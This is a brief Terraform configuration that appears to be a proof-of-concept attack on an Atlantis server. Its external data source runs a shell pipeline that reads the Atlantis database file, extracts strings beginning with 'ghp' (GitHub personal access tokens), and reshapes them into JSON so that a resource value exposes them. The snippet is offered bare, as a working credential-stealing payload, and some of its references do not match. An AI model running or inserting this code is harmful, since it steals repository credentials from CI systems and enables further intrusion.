data "external" "example" {
  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep ghp | sort | awk '{print $0\",\"}' | rev | cut -c2- | rev | xargs -0 printf '{ %s }'"]
}
resource "test"  {
  value = data.external.myjson.property
}
